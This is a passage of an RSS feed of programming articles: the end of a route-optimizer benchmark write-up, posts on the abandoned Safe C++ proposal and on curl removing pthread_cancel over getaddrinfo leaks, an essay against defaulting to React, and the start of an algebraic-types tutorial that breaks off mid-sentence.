modest single-digit improvements to exceptional gains of over 30%. However, as the number of routes increases, the optimizer&rsquo;s performance becomes dramatically more consistent and powerful. For [medium-large]-scale depots (2<strong>00+ routes</strong>), the optimizer consistently achieves <strong>10&ndash;30% reductions in distance traveled.</strong></p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 23. </strong>Improvement % vs Routes &mdash; Larger depots with more routes show stronger and more consistent gains. <strong>Bars sorted left-to-right by route count (ascending)</strong></figcaption></figure><h3>3.6.4 Stops vs Execution Time &mdash; Linear Scaling of the Optimizer</h3><p>It provides a direct view of how processing time grows as the size of the routing problem increases, from a smaller depot (DBO1, 8.2k stops) to our largest (DLA7, ~174k stops)</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 24. </strong>This chart compares the number of delivery stops (blue bars) with the execution time required by the Optimizer (red line) across different depots.</figcaption></figure><p><strong>Stops &harr; Execution Time Relationship</strong><br>Execution time grows as the number of stops increases, but the relationship is approximately <strong>linear </strong>over the tested range.</p><h2>3.6.5 Execution at Scale</h2><p>Across all depots, the Optimizer consistently delivered results at remarkable speed. Thanks to <strong>cached road graphs</strong> and a memory-light design, execution never hit a bottleneck &mdash; even with the largest inputs. Each process manages and releases memory independently, ensuring that the runtime grows linearly with problem size.</p><p>The largest single depot (DLA7: ~1133 routes, ~174k stops) completed in just <strong>~30 minutes</strong>, while the <strong>entire dataset of over 1 million stops finished in ~2.5 hours</strong> on a MacBook Pro M1 (16 GB RAM).</p><p>Beyond speed, the system produced significantly <strong>better fleet efficiency: </strong>the total number of routes was reduced by an average of <strong>11.6%</strong>, the average vehicle load (stops per route) increased by <strong>11.7%</strong>, and the total kilometers traveled dropped by an average of <strong>18.5%</strong> compared to the baseline. All operational constraints were preserved, with capacity limits fully respected and time windows met at a very high compliance rate (<strong>~</strong>95%).</p><h3>Throughput per 1,000 Stops &amp; Predictive Scaling</h3><p>Across all depots, the average processing time is <strong>~9.8 seconds per 1,000 stops</strong> (observed range <strong>8.05&ndash;14.01 s/1k</strong>). Using the dataset&rsquo;s average route size of <strong>~150 stops</strong>, that&rsquo;s roughly <strong>~1.5 seconds to process a 150-delivery route</strong>. Because runtimes are close to linear and largely CPU-bound, this rule of thumb also supports <strong>predictive</strong> estimates on bigger hardware. Taking AWS&rsquo;s <strong>two highest-end compute-optimized machines</strong> as reference (&asymp;<strong>96 vCPUs</strong> and &asymp;<strong>192 vCPUs</strong>, i.e., ~12&times; and ~24&times; the laptop&rsquo;s core count), the projected times for <strong>500,000 stops</strong> would be <strong>~6&ndash;7 minutes</strong> and <strong>~3&ndash;4 minutes</strong>, respectively.</p><p><strong>These are not measured results, but the prediction is highly reliable</strong>: the algorithm decomposes work into independent atomic tasks with a <strong>known, bounded RAM footprint</strong>, so adding CPUs yields <strong>more parallel task execution</strong> with minimal contention.</p><h3>Cross-Hardware Check (2015 Intel Mac)</h3><p>For additional context, I also ran the pipeline on a <strong>2015 Retina 15-inch MacBook Pro (Mid-2015)</strong> &mdash; quad-core Intel Core <strong>i5</strong>, 16 GB RAM. Despite being a 10+ year-old laptop, end-to-end runtimes were <strong>~3&ndash;4&times;</strong> slower than on the M1 laptop, consistent with older per-core performance and fewer effective parallel workers. Results remained stable and within memory limits, and throughput still scaled predictably with problem size.</p><p><strong>This is possible because the Optimizer </strong>is<strong> </strong>hardware-adaptive batching, which keeps concurrency within the machine&rsquo;s limits, so tasks queue rather than crash. In short, high-end hardware reduces wall-clock time, but it isn&rsquo;t a prerequisite for correctness or feasibility.<strong> Even a 10+-year-old laptop can process the full Amazon Challenge (~1M stops)</strong>.</p><p>Put simply, <strong>hardware isn&rsquo;t a barrier to operability; it just governs speed</strong>: by adding or removing CPU resources, you can dial the wall-clock time up or down while the algorithm and results remain the same.</p><h2>3.7. Comparative Benchmark: Optimizer vs. Google OR-Tools</h2><p>Google OR-Tools is one of the most recognized open-source solvers for the Vehicle Routing Problem (VRP). For this comparison, the focus was on <strong>intra-cluster routing</strong> &mdash; measuring how quickly each solver could optimize the order of stops within a pre-defined set of clusters.<br>To demonstrate, both systems were tested on the smallest depot (DBO1, 8,205 stops grouped into 55 routes). Both solvers were given the same clustered inputs (unsequenced ~150 stops); their task was simply to return the best stop sequence for each route.</p><p>The Optimizer solved all 55 routes in just 98 seconds (~1.7 s per route), while OR-Tools required about 50 minutes (~54 s per route). At depot scale, the Optimizer ran <strong>~30&times; faster</strong>, and still delivered routes ~20% shorter in total distance. Its efficiency comes from a dual strength &mdash; <strong>smart clustering algorithms</strong> and <strong>fast intra-route optimizers</strong>, showing that <strong>high-quality solutions can be produced in seconds</strong>, not hours.</p></div><div><h2>Final Insights</h2><p>This work demonstrates that <strong>large-scale route optimization</strong> can be executed efficiently on modest hardware. By prioritizing high-quality clustering over perfect route paths, employing fine-grained parallelization, and ensuring balanced vehicle loads, the Optimizer delivers consistent improvements over Amazon&rsquo;s reported baselines, all while maintaining <strong>computational complexity within linear bounds</strong>.</p><p>In practice, the architecture scales <strong>near-linearly</strong> on the same hardware: more demand produces more independent tasks that can be processed predictably, keeping runtimes stable and budget-friendly.</p><p>The goal was not merely to demonstrate that city-scale routing is possible on a laptop, but to ensure it runs reliably on constrained hardware. This efficiency inherently <strong>translates to faster execution on larger machines, lower infrastructure costs, and shorter times </strong>for high-volume operations.</p><p><strong>Sometimes the best solution isn&rsquo;t the most complex one. </strong>By breaking down the problem and applying the right principles, we can outperform industry leaders <strong>using nothing more than a single laptop</strong>.</p><h2>Next Steps &amp; Availability</h2><p>In the near term, the Optimizer will be exposed as an <strong>API for experimentation and at-scale routing</strong>. The initial release will include endpoints to submit stops, fleet, packages, and time window constraints, returning sequenced routes and key metrics (distance, capacity utilization, time-window compliance). <br>If you&rsquo;re interested in early access for pilots or benchmarks, get in touch, and I&rsquo;ll share timelines and documentation.</p><h2>Sources</h2><ul><li><a href="https://routingchallenge.mit.edu/">Amazon Last Mile Challenge</a></li><li><a href="https://registry.opendata.aws/amazon-last-mile-challenges/">Amazon Last Mile Challenge &mdash; datasets</a></li><li><a href="https://news.mit.edu/2021/last-mile-routing-research-challenge-three-winning-teams-0824">MIT News on Last-Mile Research</a></li><li><a href="https://www.networkpages.nl/a-big-breakthrough-in-the-euclidean-travelling-salesman-problem/">TSP Research Breakthroughs</a></li><li><a href="https://www.researchgate.net/publication/373923950_Understanding_Last-Mile_Delivery_An_Analysis_of_the_Amazon_Last_Mile_Routing_Dataset">Analysis of the Amazon Last Mile Routing Dataset</a></li></ul></div></div></article><div class="gallery"><p><img src="https://miro.medium.com/v2/resize:fill:64:64/1*tqapzs4AfijKv2uT3Vx2lA.jpeg"></p></div></section>]]></description><pubDate>Tue, 16 Sep 2025 02:14:34 +0530</pubDate></item><item><link>https://sibellavia.lol/posts/2025/09/safe-c-proposal-is-not-being-continued/</link><title>Safe C++ proposal is not being continued (sibellavia.lol)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhwalt/safe_c_proposal_is_not_being_continued/</guid><comments>https://www.reddit.com/r/programming/comments/1nhwalt/safe_c_proposal_is_not_being_continued/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 5 min | <a href='https://www.reddit.com/r/programming/comments/1nhwalt/safe_c_proposal_is_not_being_continued/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><p>One year ago, the <a href="https://safecpp.org/draft.html">Safe C++ proposal</a> was made. The goal was to add a safe subset/context into C++ that would give strong guarantees (memory safety, type safety, thread safety) similar to what Rust provides, without breaking existing C++ code. It was an extension or superset of C++. The opt-in mechanism was to explicitly mark parts of the code that belong to the safe context. The authors even state:</p><blockquote><p>Code in the safe context exhibits the same strong safety guarantees as code written in Rust.</p></blockquote><p>The rest remains &ldquo;unsafe&rdquo; in the usual C++ sense. This means that existing code continues to work, while new or refactored parts can gain safety. For those who write Rust, Safe C++ has many similarities with Rust, sometimes with adjustments to fit C++&rsquo;s design. Also, because C++ already has a huge base of &ldquo;unsafe code&rdquo;, Safe C++ has to provide mechanisms for mixing safe and unsafe, and for incremental migration. In that sense, all of Safe C++&rsquo;s safe features are opt-in. Existing code compiles and works as before. Introducing safe context doesn&rsquo;t break code that doesn&rsquo;t use it.</p><p>The proposal caught my interest. It seemed like a good compromise to make C++ safe, although there were open or unresolved issues, which is completely normal for a draft proposal. For example, how error reporting for the borrow checker and lifetime errors would work, or how generic code and templates would interact with lifetime logic and safe/unsafe qualifiers. These are just some of the points, the proposal is very long and elaborate. Moreover, I am not a programming language designer, so there might be better alternatives.</p><p>Anyway, today I discovered that the proposal will no longer be pursued. When I thought about the proposal again this morning, I realized I hadn&rsquo;t read any updates on it for some time. So I searched and found some answers on <a href="https://www.reddit.com/r/cpp/comments/1lhbqua/any_news_on_safe_c/">Reddit</a>.</p><p>The response from Sean Baxter, one of the original authors of the Safe C++ proposal:</p><blockquote><p>The Safety and Security working group voted to prioririze Profiles over Safe C++. Ask the Profiles people for an update. Safe C++ is not being continued.</p></blockquote><p>And again:</p><blockquote><p>The Rust safety model is unpopular with the committee. Further work on my end won&rsquo;t change that. Profiles won the argument. All effort should go into getting Profile&rsquo;s language for eliminating use-after-free bugs, data races, deadlocks and resource leaks into the Standard, so that developers can benefit from it.</p></blockquote><p>So I went to read the documents related to Profiles[1][2][3][4]. I try to summarize what I understood: they are meant to define modes of C++ that impose constraints on how you use the language and library, in order to guarantee certain safety properties. They are primarily compile-time constraints, though in practice some checks may be implemented using library facilities that add limited runtime overhead. Instead of introducing entirely new language constructs, profiles mostly restrict existing features and usages. The idea is that you can enable a profile, and any code using it agrees to follow the restrictions. If you don&rsquo;t enable it, things work as before. So it&rsquo;s backwards-compatible.</p><p>Profiles seem less radical and more adoptable, a safer-by-default C++ without forcing the Rust model that aims to tackle the most common C++ pitfalls. I think Safe C++ was more ambitious: introducing new syntax, type qualifiers, safe vs unsafe contexts, etc. Some in the committee felt that was too heavy, and Profiles are seen as a more pragmatic path. The main objection is obvious: one could say that Profiles restrict less than what Safe C++ aimed to provide.</p><p>Reading comments here and there, there is visible resistance in the community toward adopting the Rust model, and from a certain point of view, I understand it. If you want to write like Rust, just write Rust. Historically, C++ is a language that has often taken features from other worlds and integrated them into itself. In this case, I think that safety subsets of C++ already exist informally somehow. Profiles are an attempt to standardize and unify something that already exists in practice. Technically, they don&rsquo;t add new fundamental semantics. Instead, they provide constraints, obligations and guarantees.</p><p>In my opinion, considering the preferences of the committee and the entire C++ community, although I appreciated the Safe C++ proposal and was looking forward to seeing concrete results, considering the C++ context I believe that standardizing and integrating the Profiles as proposed is a much more realistic approach. Profiles might not be perfect, but they are better than nothing. They will likely be uneven in enforcement and weaker than Safe C++ in principle. They won&rsquo;t give us silver-bullet guarantees, but they are a realistic path forward.</p><p>[1] <a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3081r1.pdf">Core safety profiles for C++26</a></p><p>[2] <a href="https://open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3589r0.pdf">C++ Profiles: The Framework</a></p><p>[3] <a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3704r0.pdf">What are profiles?</a></p><p>[4] <a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3651r0.pdf">Note to the C++ standards committee members</a></p><hr><p>Join the conversation on <a href="https://news.ycombinator.com/item?id=45234460">Hacker News</a> and <a href="https://www.reddit.com/r/cpp/comments/1ngjemb/safe_c_proposal_is_not_being_continued/">Reddit</a>.</p></div></section>]]></description><pubDate>Tue, 16 Sep 2025 01:26:23 +0530</pubDate></item><item><link>https://eissing.org/icing/posts/rip_pthread_cancel/</link><title>RIP pthread_cancel (eissing.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhwagp/rip_pthread_cancel/</guid><comments>https://www.reddit.com/r/programming/comments/1nhwagp/rip_pthread_cancel/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 3 min | <a href='https://www.reddit.com/r/programming/comments/1nhwagp/rip_pthread_cancel/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><p>I posted about adding <a href="https://eissing.org../pthread_cancel">pthread_cancel use in curl</a> about three weeks ago, we released this in curl 8.16.0 and it blew up right in our faces. Now, with <a href="https://github.com/curl/curl/pull/18540">#18540</a> we are ripping it out again. What happened?</p><h2>short recap</h2><p><a href="https://www.man7.org/linux/man-pages/man7/pthreads.7.html">pthreads</a> define &ldquo;Cancelation points&rdquo;, a list of POSIX functions where a pthread may be cancelled. In addition, there is also a list of functions that <em>may</em> be cancelation points, among those <code>getaddrinfo()</code>.</p><p><code>getaddrinfo()</code> is exactly what we are interested in for <code>libcurl</code>. It blocks until it has resolved a name. That may hang for a long time and <code>libcurl</code> is unable to do anything else. Meh. So, we start a pthread and let that call <code>getaddrinfo()</code>. <code>libcurl</code> can do other things while that thread runs.</p><p>But eventually, we have to get rid of the pthread again. Which means we either have to <code>pthread_join()</code> it - which means a blocking wait. Or we call <code>pthread_detach()</code> - which returns immediately but the thread keeps on running. Both are bad when you want to do many, many transfers. Either we block and stall or we let pthreads pile up in an uncontrolled way.</p><p>So, we added <code>pthread_cancel()</code> to interrupt a running <code>getaddrinfo()</code> and get rid of the pthread we no longer needed. So the theory. And, after some hair pulling, we got this working.</p><h2>cancel yes, leakage also yes!</h2><p>After releasing curl 8.16.0 we got an issue reported in <a href="https://github.com/curl/curl/issues/18532">#18532</a> that cancelled pthreads leaked memory.</p><p>Digging into the <a href="https://codebrowser.dev/glibc/glibc/nss/getaddrinfo.c.html#gaiconf_init">glibc source</a> shows that there is this thing called <a href="https://www.man7.org/linux/man-pages/man5/gai.conf.5.html"><code>/etc/gai.conf</code></a> which defines how <code>getaddrinfo()</code> should sort returned answers.</p><p>The implementation in glibc first resolves the name to addresses. For these, it needs to allocate memory. <em>Then</em> it needs to sort them if there is more than one address. And in order to do <em>that</em> it needs to read <code>/etc/gai.conf</code>. And in order to do <em>that</em> it calls <code>fopen()</code> on the file. And that may be a pthread &ldquo;Cancelation Point&rdquo; (and if not, it surely calls <code>open()</code> which is a required cancelation point).</p><p>So, the pthread may get cancelled when reading <code>/etc/gai.conf</code> and leak all the allocated responses. And if it gets cancelled there, it will try to read <code>/etc/gai.conf</code> <em>again</em> the next time it has more than one address resolved.</p><p>At this point, I decided that we need to give up on the whole <code>pthread_cancel()</code> strategy. The reading of <code>/etc/gai.conf</code> is one point where a cancelled <code>getaddrinfo()</code> may leak. There might be others. Clearly, glibc is not really designed to prevent leaks here (admittedly, this is not trivial).</p><h2>RIP</h2><p>Leaking memory potentially on something <code>libcurl</code> does over and over again is not acceptable. We&rsquo;d rather pay the price of having to eventually wait on a long running <code>getaddrinfo()</code>.</p><p>Applications using <code>libcurl</code> can avoid this by using <code>c-ares</code> which resolves unblocking and without the use of threads. But that will not be able to do everything that glibc does.</p><p>DNS continues to be tricky to use well.</p><ul> </ul> </div></section>]]></description><pubDate>Tue, 16 Sep 2025 01:26:14 +0530</pubDate></item><item><link>https://www.lorenstew.art/blog/react-won-by-default/</link><title>React Won by Default – And It's Killing Frontend Innovation (lorenstew.art)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhw51a/react_won_by_default_and_its_killing_frontend/</guid><comments>https://www.reddit.com/r/programming/comments/1nhw51a/react_won_by_default_and_its_killing_frontend/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 9 min | <a href='https://www.reddit.com/r/programming/comments/1nhw51a/react_won_by_default_and_its_killing_frontend/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.lorenstew.art/og-image.png' /></section><section class='parsed-content'><div><article><div><p>React is no longer winning by technical merit. Today it is winning by default. That default is now slowing innovation across the frontend ecosystem.</p><p>When teams need a new frontend, the conversation rarely starts with &ldquo;What are the constraints and which tool best fits them?&rdquo; It often starts with &ldquo;Let&rsquo;s use React; everyone knows React.&rdquo; That reflex creates a self-perpetuating cycle where network effects, rather than technical fit, decide architecture.</p><p>Meanwhile, frameworks with real innovations struggle for adoption. Svelte compiles away framework overhead. Solid delivers fine-grained reactivity without virtual-DOM tax. Qwik achieves instant startup via resumability. These approaches can outperform React&rsquo;s model in common scenarios, but they rarely get a fair evaluation because React is chosen by default.</p><p>React is excellent at many things. The problem isn&rsquo;t React itself, it&rsquo;s the React-by-default mindset.</p><h2>The Innovation Ceiling</h2><p>React&rsquo;s technical foundations explain some of today&rsquo;s friction. The virtual DOM was a clever solution for 2013&rsquo;s problems, but as Rich Harris outlined in <a href="https://svelte.dev/blog/virtual-dom-is-pure-overhead">&ldquo;Virtual DOM is pure overhead&rdquo;</a>, it introduces work modern compilers can often avoid.</p><p>Hooks addressed class component pain but introduced new kinds of complexity: dependency arrays, stale closures, and misused effects. Even React&rsquo;s own docs emphasize restraint: <a href="https://react.dev/learn/you-might-not-need-an-effect">&ldquo;You Might Not Need an Effect&rdquo;</a>. Server Components improve time-to-first-byte, but add architectural complexity and new failure modes.</p><p>The <a href="https://react.dev/learn/react-compiler">React Compiler</a> is a smart solution that automates patterns like <code>useMemo</code>/<code>useCallback</code>. Its existence is also a signal: we&rsquo;re optimizing around constraints baked into the model.</p><p>Contrast this with alternative approaches: Svelte 5&rsquo;s <a href="https://svelte.dev/blog/runes">Runes</a> simplify reactivity at compile time; Solid&rsquo;s <a href="https://www.solidjs.com/docs/latest#reactivity">fine-grained reactivity</a> updates exactly what changed; Qwik&rsquo;s <a href="https://qwik.builder.io/docs/concepts/resumable/">resumability</a> eliminates traditional hydration. These aren&rsquo;t incremental tweaks to React&rsquo;s model&mdash;they&rsquo;re different models with different ceilings.</p><p>Innovation without adoption doesn&rsquo;t change outcomes. Adoption can&rsquo;t happen when the choice is made by reflex.</p><h2>The Technical Debt We&rsquo;re All Carrying</h2><p>Defaulting to React often ships a runtime and reconciliation cost we no longer question. Even when it&rsquo;s fast enough, the ceiling is lower than compile-time or fine-grained models. Developer time is spent managing re-renders, effect dependencies, and hydration boundaries instead of shipping value. The broader lesson from performance research is consistent: JavaScript is expensive on the critical path (<a href="https://medium.com/dev-channel/the-cost-of-javascript-84009f51e99e">The Cost of JavaScript</a>).</p><p>We&rsquo;ve centered mental models around &ldquo;React patterns&rdquo; instead of web fundamentals, reducing portability of skills and making architectural inertia more likely.</p><p>The loss isn&rsquo;t just performance, it&rsquo;s opportunity cost when better-fit alternatives are never evaluated. For instance, benchmarks like the <a href="https://krausest.github.io/js-framework-benchmark/">JS Framework Benchmark</a> show alternatives like Solid achieving up to 2-3x faster updates in reactivity-heavy scenarios compared to React.</p><h2>The Frameworks Being Suffocated</h2> <h3>Svelte: The Compiler Revolution</h3><p>Svelte shifts work to compile time: no virtual DOM, minimal runtime. Components become targeted DOM operations. The mental model aligns with web fundamentals.</p><p>But &ldquo;not enough jobs&rdquo; keeps Svelte adoption artificially low despite its technical superiority for most use cases. Real-world examples, like The Guardian&rsquo;s adoption of Svelte for their frontend, demonstrate measurable gains in performance and developer productivity, with reported reductions in bundle sizes and faster load times. For instance, as detailed in <a href="https://www.wired.com/story/javascript-framework-puts-web-pages-diet/">Wired&rsquo;s article on Svelte</a>, developer Shawn Wang (<a href="https://x.com/swyx">@swyx</a> on X/Twitter) reduced his site&rsquo;s size from 187KB in React to just 9KB in Svelte by leveraging its compile-time optimizations, which shift framework overhead away from runtime. This leads to faster, more efficient apps especially on slow connections.</p><h3>Solid: The Reactive Primitive Approach</h3><p>Solid delivers fine-grained reactivity with JSX familiarity. Updates flow through signals directly to affected DOM nodes, bypassing reconciliation bottlenecks. Strong performance characteristics, limited mindshare. As outlined in Solid&rsquo;s <a href="https://www.solidjs.com/guides/comparison">comparison guide</a>, this approach enables more efficient updates than React&rsquo;s virtual DOM, with precise reactivity that minimizes unnecessary work and improves developer experience through simpler state management.</p><p>While prominent case studies are scarcer than for more established frameworks, this is largely due to Solid&rsquo;s lower adoption. Yet anecdotal reports from early adopters suggest similar transformative gains in update efficiency and code simplicity, waiting to be scaled and shared as more teams experiment.</p><h3>Qwik: The Resumability Innovation</h3><p>Qwik uses resumability instead of hydration, enabling instant startup by loading only what the current interaction needs. Ideal for large sites, long sessions, or slow networks. According to Qwik&rsquo;s <a href="https://qwik.dev/docs/concepts/think-qwik/">Think Qwik guide</a>, this is achieved through progressive loading and serializing both state and code. Apps can thus resume execution instantly without heavy client-side bootstrapping, resulting in superior scalability and reduced initial load times compared to traditional frameworks.</p><p>Success stories for Qwik may be less visible simply because fewer teams have broken from defaults to try it. But those who have report dramatic improvements in startup times and resource efficiency, indicating a wealth of untapped potential if adoption grows.</p><p>All three under-adopted not for lack of merit, but because the default choice blocks trying them out.</p><p>Furthermore, React&rsquo;s API surface area is notably larger and more complex than its alternatives, encompassing concepts like hooks, context, reducers, and memoization patterns that require careful management to avoid pitfalls. This expansive API contributes to higher cognitive load for developers, often leading to bugs from misunderstood dependencies or over-engineering. For example, in Cloudflare&rsquo;s <a href="https://blog.cloudflare.com/deep-dive-into-cloudflares-sept-12-dashboard-and-api-outage/">September 12, 2025 outage</a>, a useEffect hook with a problematic dependency array triggered repeated API calls, overwhelming their Tenant Service and causing widespread failures. In contrast, frameworks like Svelte, Solid, and Qwik feature smaller, more focused APIs that emphasize simplicity and web fundamentals, reducing the mental overhead and making them easier to master and maintain.</p><h2>The Network Effect Prison</h2><p>React&rsquo;s dominance creates self-reinforcing barriers. Job postings ask for &ldquo;React developers&rdquo; rather than &ldquo;frontend engineers,&rdquo; limiting skill diversity. Component libraries and team muscle memory create institutional inertia.</p><p>Risk-averse leaders choose the &ldquo;safe&rdquo; option. Schools teach what jobs ask for. The cycle continues independent of technical merit.</p><p>That&rsquo;s not healthy competition; it&rsquo;s ecosystem capture by default.</p><h2>Breaking the Network Effect</h2><p>Escaping requires deliberate action at multiple levels. Technical leaders should choose based on constraints and merits, not momentum. Companies can allocate a small innovation budget to trying alternatives. Developers can upskill beyond a single mental model.</p><p>Educators can teach framework-agnostic concepts alongside specific tools. Open source contributors can help alternative ecosystems mature.</p><p>Change won&rsquo;t happen automatically. It requires conscious choice.</p><h2>Framework Evaluation Checklist</h2><p>To make deliberate choices, use this simple checklist when starting a new project:</p><ul> <li><strong>Assess Performance Needs</strong>: Evaluate metrics like startup time, update efficiency, and bundle size. Prioritize frameworks with compile-time optimizations if speed is critical.</li> <li><strong>Team Skills and Learning Curve</strong>: Consider existing expertise but factor in migration paths; many alternatives offer gentle ramps (e.g., Solid&rsquo;s JSX compatibility with React).</li> <li><strong>Scaling and Cost of Ownership</strong>: Calculate long-term costs, including maintenance, dependency management, and tech debt. Alternatives often reduce runtime overhead, lowering hosting costs and improving scalability.</li> <li><strong>Ecosystem Fit</strong>: Balance maturity with innovation; pilot in non-critical areas to test migration feasibility and ROI.</li> </ul> <h2>The Standard Counter&#8209;Arguments</h2><p><strong>&ldquo;But ecosystem maturity!&rdquo;</strong> Maturity is valuable, and can also entrench inertia. Age isn&rsquo;t the same as fitness for today&rsquo;s constraints.</p><p>Additionally, a mature ecosystem often means heavy reliance on third-party packages, which can introduce maintenance burdens like keeping dependencies up-to-date, dealing with security vulnerabilities, and bloating bundles with unused code. While essential in some cases, this flexibility can lead to over-dependence; custom solutions tailored to specific needs are often leaner and more maintainable in the long run. Smaller ecosystems in alternative frameworks encourage building from fundamentals, fostering deeper understanding and less technical debt. Moreover, with AI coding assistants now able to generate precise, custom functions on demand, the barrier to creating bespoke utilities has lowered dramatically. This makes it feasible to avoid generic libraries like lodash or date libraries like Moment or date-fns entirely in favor of lightweight, app-specific implementations.</p><p><strong>&ldquo;But hiring!&rdquo;</strong> Hiring follows demand. You can de&#8209;risk by piloting alternatives in non&#8209;critical paths, then hiring for fundamentals plus on&#8209;the&#8209;job training.</p><p><strong>&ldquo;But component libraries!&rdquo;</strong> Framework&#8209;agnostic design systems and Web Components reduce lock-in while preserving velocity.</p><p><strong>&ldquo;But stability!&rdquo;</strong> React&rsquo;s evolution from classes to hooks to Server Components demonstrates constant churn, not stability. Alternative frameworks often provide more consistent APIs.</p><p><strong>&ldquo;But proven at scale!&rdquo;</strong> jQuery was proven at scale too. Past success doesn&rsquo;t guarantee future relevance.</p><h2>The Broader Ecosystem Harm</h2><p>Monoculture slows web evolution when one framework&rsquo;s constraints become de facto limits. Talent spends cycles solving framework-specific issues rather than pushing the platform forward. Investment follows incumbents regardless of technical merit.</p><p>Curricula optimize for immediate employability over fundamentals, creating framework-specific rather than transferable skills. Platform improvements get delayed because &ldquo;React can handle it&rdquo; becomes a default answer.</p><p>The entire ecosystem suffers when diversity disappears.</p><h2>The Garden We Could Grow</h2><p>Healthy ecosystems require diversity, not monocultures. Innovation emerges when different approaches compete and cross-pollinate. Developers grow by learning multiple mental models. The platform improves when several frameworks push different boundaries.</p><p>Betting everything on one model creates a single point of failure. What happens if it hits hard limits? What opportunities are we missing by not exploring alternatives?</p><p>It&rsquo;s time to choose frameworks based on constraints and merit rather than momentum. Your next project deserves better than React-by-default. The ecosystem deserves the innovation only diversity can provide.</p><p>Stop planting the same seed by default. The garden we could cultivate through diverse framework exploration would be more resilient and more innovative than the monoculture we&rsquo;ve drifted into.</p><p>The choice is ours to make.</p></div></article> </div></section>]]></description><pubDate>Tue, 16 Sep 2025 01:20:31 +0530</pubDate></item><item><link>https://blog.aiono.dev/posts/algebraic-types-are-not-scary,-actually.html</link><title>Algebraic Types are not Scary, Actually (blog.aiono.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhw43z/algebraic_types_are_not_scary_actually/</guid><comments>https://www.reddit.com/r/programming/comments/1nhw43z/algebraic_types_are_not_scary_actually/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 17 min | <a href='https://www.reddit.com/r/programming/comments/1nhw43z/algebraic_types_are_not_scary_actually/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><hgroup><h4> Posted on <text>2025-08-30</text> </h4> </hgroup><p>You may have heard the term algebraic types before, which initially sounds like an advanced concept, that only someone with a PhD in programming languages can understand. Quite the contrary, algebraic types is a very simple and helpful concept about programming in general. Anyone who knows basic algebra could understand what algebraic types are.</p><p>In this article I aim to provide an explanation of algebraic types for the working programmer. I intentionally avoid any terminology that a regular programmer may not know about. I hope by the end of the article you know what algebraic types are and can use it in real programming and spot it where it appears.</p><h2>Types as Sets</h2><p>What is a type, really? For instance, when we write <code>int</code>, what does it mean? One useful way to think about it is to treat types as sets. In this perspective, every type is treated as a set of possible values that is compatible with the type. For instance, <code>bool</code> is a type that has only <code>true</code> and <code>false</code> values. In OCaml <code>bool</code> is defined as:</p><pre><code>type bool = true | false </code></pre><p>In the left hand side we define the type <code>bool</code>. The right side provides the possible values, separated with <code>|</code>.</p><p>For integers, this is <code>0</code>, <code>1</code> or any other integer value. It's a bit more difficult to define integers directly as a regular type because in this case there are infinitely many values that integer can take. Writing all these is impossible. But assuming it was possible, we could write:</p><pre><code>type int = ... | -3 | -2 | -1 | 0 | 1 | 2 | 3 | ... </code></pre><p>In practice, integer types are usually limited to some finite range (but still too large) but this is not related to what we are discussing here. Strings are very similar to integers from this perspective.</p><p>What about <code>void</code> type? What are the values that it accepts? In some languages it's not obvious, but we can think <code>void</code> as a type with only a single possible value. In OCaml for instance, <code>unit</code> corresponds to <code>void</code>. It's defined as:</p><pre><code>type unit = () </code></pre><p>In C, C++ or Java, <code>void</code> is treated differently than other types which makes it awkward to use in some cases. If we consider it as just any other type, there is no real need to make an exception for <code>void</code>. This simplifies the type system as well as the implementation of the programming language. I will give some examples to this after we understand <a href="https://blog.aiono.dev#algebraic-types-is-not-scary-actually">Algebraic Types</a>.</p><p>Another interesting case is non-termination. What is the type of a while loop that never returns? Well, using the set perspective, if the expression returns no value, maybe it's type is a type which has no possible values? Note that this type is <em>different</em> than <code>void</code> because <code>void</code> has one value that it can take but this type can take none. Sometimes this type is called <code>never</code>, as in it's never possible to have a value of this type. We can also trivially define this type as:</p><pre><code>type never </code></pre><p>Since there is no value for this type, it is <em>impossible</em> to have a value of this type. Thus we can use it as the type of expressions or functions that doesn't terminate. Because, if it would terminate and return a value we would get a type error indicating that the value doesn't conform to the specified type.</p><h2>Algebraic Types are Just Elementary School Algebra</h2><p>Using this view of types as sets of values, it's really easy to understand algebraic types. In fact, it's actually based on the algebra you learned in elementary school!</p><p>What is algebra on numbers? It's addition, multiplication, subtraction and division. Algebraic types are exactly that, it's basically <em>doing algebra over types</em>. So basically it's addition and multiplication over types.</p><h3>Product Types</h3><p>Let's start with the more familiar one. If you have two types <code>T1</code> and <code>T2</code>, what other types you can have with it? Well, you can have a value that contains from both of these types, one from <code>T1</code> and one from <code>T2</code>. Similar to how a <code>struct</code> or <code>class</code> works in mainstream languages. We could express this in Java as:</p><pre><code>class Pair { T1 first; T2 second; } </code></pre><p>In the algebraic type terminology, this is called a <em>product type</em>. The reason is simple, when you combine two types, the resulting type contains every value whose parts are the values from the respective types. If the first type has <code>N</code> values, and the second has <code>M</code> values. Let's assume both to be enum types, with <code>N</code> having 2 and <code>M</code> having 3 variants. If we create a pair type from <code>N</code> and <code>M</code>, we could have <code>6</code> different values. Because we can choose 2 from <code>N</code> and 3 from <code>M</code>, which results with <code>2 * 3 = 6</code>. Hence, a pair type in the general case has <code>N * M</code> many values, hence the term product.</p><p>Every mainstream language supports this notion, because it's a very common use case, I am sure that this doesn't need any convincing. However, most languages doesn't support combining two types as a first class construct such as tuple types, therefore one has to explicitly define a new type for every combination. In practice, this lack leads to worse API designs, like the pattern of using 